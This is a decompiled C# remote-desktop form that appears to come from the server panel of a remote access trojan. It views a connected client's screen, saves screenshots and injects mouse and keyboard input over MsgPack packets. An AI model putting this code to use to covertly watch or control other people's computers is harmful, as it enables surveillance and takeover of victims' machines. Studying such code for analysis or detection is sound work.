using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;
using StreamLibrary;

namespace Server.Forms
{
	// Token: 0x02000061 RID: 97
	public partial class FormRemoteDesktop : DarkForm
	{
		// Token: 0x170000A9 RID: 169
		// (get) Token: 0x060003C0 RID: 960 RVA: 0x000258B0 File Offset: 0x000258B0
		// (set) Token: 0x060003C1 RID: 961 RVA: 0x000258B8 File Offset: 0x000258B8
		public global::Form1 F { get; set; }

		// Token: 0x170000AA RID: 170
		// (get) Token: 0x060003C2 RID: 962 RVA: 0x000258C4 File Offset: 0x000258C4
		// (set) Token: 0x060003C3 RID: 963 RVA: 0x000258CC File Offset: 0x000258CC
		internal Clients ParentClient { get; set; }

		// Token: 0x170000AB RID: 171
		// (get) Token: 0x060003C4 RID: 964 RVA: 0x000258D8 File Offset: 0x000258D8
		// (set) Token: 0x060003C5 RID: 965 RVA: 0x000258E0 File Offset: 0x000258E0
		internal Clients Client { get; set; }

		// Token: 0x170000AC RID: 172
		// (get) Token: 0x060003C6 RID: 966 RVA: 0x000258EC File Offset: 0x000258EC
		// (set) Token: 0x060003C7 RID: 967 RVA: 0x000258F4 File Offset: 0x000258F4
		public string FullPath { get; set; }

		// Token: 0x170000AD RID: 173
		// (get) Token: 0x060003C8 RID: 968 RVA: 0x00025900 File Offset: 0x00025900
		// (set) Token: 0x060003C9 RID: 969 RVA: 0x00025908 File Offset: 0x00025908
		public Image GetImage { get; set; }

		// Token: 0x060003CA RID: 970 RVA: 0x00025914 File Offset: 0x00025914
		public FormRemoteDesktop()
		{
			this._keysPressed = new List<Keys>();
			this.InitializeComponent();
		}

		// Token: 0x060003CB RID: 971 RVA: 0x00025954 File Offset: 0x00025954
		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x060003CC RID: 972 RVA: 0x000259B4 File Offset: 0x000259B4
		private void FormRemoteDesktop_Load(object sender, EventArgs e)
		{
			try
			{
				this.button1.Tag = "stop";
			}
			catch
			{
			}
		}

		// Token: 0x060003CD RID: 973 RVA: 0x000259EC File Offset: 0x000259EC
		private void Button1_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "play")
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "capture";
				msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value.ToString());
				msgPack.ForcePathObject("Screen").AsInteger = (long)Convert.ToInt32(this.numericUpDown2.Value.ToString());
				this.decoder = new UnsafeStreamCodec(Convert.ToInt32(this.numericUpDown1.Value), true);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.numericUpDown1.Enabled = false;
				this.numericUpDown2.Enabled = false;
				this.btnSave.Enabled = true;
				this.btnMouse.Enabled = true;
				this.button1.Tag = "stop";
				this.button1.BackgroundImage = Resources.stop__1_;
				return;
			}
			this.button1.Tag = "play";
			try
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack2.ForcePathObject("Option").AsString = "stop";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
			}
			catch
			{
			}
			this.numericUpDown1.Enabled = true;
			this.numericUpDown2.Enabled = true;
			this.btnSave.Enabled = false;
			this.btnMouse.Enabled = false;
			this.button1.BackgroundImage = Resources.play_button;
		}

		// Token: 0x060003CE RID: 974 RVA: 0x00025BD4 File Offset: 0x00025BD4
		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (this.button1.Tag == "stop")
			{
				if (this.timerSave.Enabled)
				{
					this.timerSave.Stop();
					this.btnSave.BackgroundImage = Resources.save_image;
					return;
				}
				this.timerSave.Start();
				this.btnSave.BackgroundImage = Resources.save_image2;
				try
				{
					if (!Directory.Exists(this.FullPath))
					{
						Directory.CreateDirectory(this.FullPath);
					}
					Process.Start(this.FullPath);
				}
				catch
				{
				}
			}
		}

		// Token: 0x060003CF RID: 975 RVA: 0x00025C80 File Offset: 0x00025C80
		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				Encoder quality = Encoder.Quality;
				EncoderParameters encoderParameters = new EncoderParameters(1);
				EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
				encoderParameters.Param[0] = encoderParameter;
				ImageCodecInfo encoder = this.GetEncoder(ImageFormat.Jpeg);
				this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
				if (encoderParameters != null)
				{
					encoderParameters.Dispose();
				}
				if (encoderParameter != null)
				{
					encoderParameter.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060003D0 RID: 976 RVA: 0x00025D44 File Offset: 0x00025D44
		private ImageCodecInfo GetEncoder(ImageFormat format)
		{
			foreach (ImageCodecInfo imageCodecInfo in ImageCodecInfo.GetImageDecoders())
			{
				if (imageCodecInfo.FormatID == format.Guid)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x060003D1 RID: 977 RVA: 0x00025D90 File Offset: 0x00025D90
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 2;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 8;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					msgPack.ForcePathObject("Button").AsInteger = (long)num;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060003D2 RID: 978 RVA: 0x00025EFC File Offset: 0x00025EFC
		private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					int num = 0;
					if (e.Button == MouseButtons.Left)
					{
						num = 4;
					}
					if (e.Button == MouseButtons.Right)
					{
						num = 16;
					}
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseClick";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					msgPack.ForcePathObject("Button").AsInteger = (long)num;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060003D3 RID: 979 RVA: 0x0002606C File Offset: 0x0002606C
		private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
				{
					Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
					msgPack.ForcePathObject("Option").AsString = "mouseMove";
					msgPack.ForcePathObject("X").AsInteger = (long)point.X;
					msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
			}
			catch
			{
			}
		}

		// Token: 0x060003D4 RID: 980 RVA: 0x000261A0 File Offset: 0x000261A0
		private void Button3_Click(object sender, EventArgs e)
		{
			if (this.isMouse)
			{
				this.isMouse = false;
				this.btnMouse.BackgroundImage = Resources.mouse;
			}
			else
			{
				this.isMouse = true;
				this.btnMouse.BackgroundImage = Resources.mouse_enable;
			}
			this.pictureBox1.Focus();
		}

		// Token: 0x060003D5 RID: 981 RVA: 0x000261FC File Offset: 0x000261FC
		private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				Image getImage = this.GetImage;
				if (getImage != null)
				{
					getImage.Dispose();
				}
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					Clients client = this.Client;
					if (client == null)
					{
						return;
					}
					client.Disconnected();
				});
			}
			catch
			{
			}
		}

		// Token: 0x060003D6 RID: 982 RVA: 0x00026250 File Offset: 0x00026250
		private void btnKeyboard_Click(object sender, EventArgs e)
		{
			if (this.isKeyboard)
			{
				this.isKeyboard = false;
				this.btnKeyboard.BackgroundImage = Resources.keyboard;
			}
			else
			{
				this.isKeyboard = true;
				this.btnKeyboard.BackgroundImage = Resources.keyboard_on;
			}
			this.pictureBox1.Focus();
		}

		// Token: 0x060003D7 RID: 983 RVA: 0x000262AC File Offset: 0x000262AC
		private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isKeyboard)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				if (this._keysPressed.Contains(e.KeyCode))
				{
					return;
				}
				this._keysPressed.Add(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(true);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x060003D8 RID: 984 RVA: 0x000263BC File Offset: 0x000263BC
		private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
		{
			if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && base.ContainsFocus && this.isKeyboard)
			{
				if (!this.IsLockKey(e.KeyCode))
				{
					e.Handled = true;
				}
				this._keysPressed.Remove(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(false);
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
		}

		// Token: 0x060003D9 RID: 985 RVA: 0x000264B4 File Offset: 0x000264B4
		private bool IsLockKey(Keys key)
		{
			return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
		}

		// Token: 0x0400028F RID: 655
		public int FPS;

		// Token: 0x04000290 RID: 656
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x04000291 RID: 657
		public IUnsafeCodec decoder = new UnsafeStreamCodec(60, true);

		// Token: 0x04000292 RID: 658
		public Size rdSize;

		// Token: 0x04000293 RID: 659
		private bool isMouse;

		// Token: 0x04000294 RID: 660
		private bool isKeyboard;

		// Token: 0x04000295 RID: 661
		public object syncPicbox = new object();

		// Token: 0x04000296 RID: 662
		private readonly List<Keys> _keysPressed;
	}
}
